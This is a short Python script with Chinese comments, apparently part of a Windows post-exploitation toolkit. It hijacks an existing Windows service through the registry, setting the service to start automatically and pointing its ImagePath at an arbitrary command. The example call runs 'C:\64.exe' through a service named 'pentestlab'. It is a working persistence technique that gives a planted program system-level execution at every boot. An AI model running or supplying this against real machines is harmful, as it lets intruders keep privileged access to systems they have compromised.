#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.04
# @Author  : Lhaihai
# @File    : modify_service
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 通过注册表修改服务
"""
import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('修改服务')

# 在HKCU的Run 添加
def set_reg_service(cmd,service):

    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SYSTEM\CurrentControlSet\Services\\" + service
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        #获取键(可用于其他操作)
        key = reg.get_key()
    else:
        logger.error(service + '服务不存在')
        return

    try:
        # reg.create_value('ErrorControl',pyregedit.REG_DWORD,0x01)
        # reg.create_value('ObjectName',pyregedit.REG_SZ,'LocalSystem')
        reg.create_value('Start',pyregedit.REG_DWORD,0x02)
        reg.create_value('Type',pyregedit.REG_DWORD,0x10)
        reg.create_value('ImagePath',pyregedit.REG_EXPAND_SZ,cmd)
        logger.info('修改服务成功')
    except Exception as e:
        logger.error('修改服务失败： '+str(e))


if __name__ == '__main__':
    set_reg_service(r'cmd.exe /k C:\64.exe xxx','pentestlab')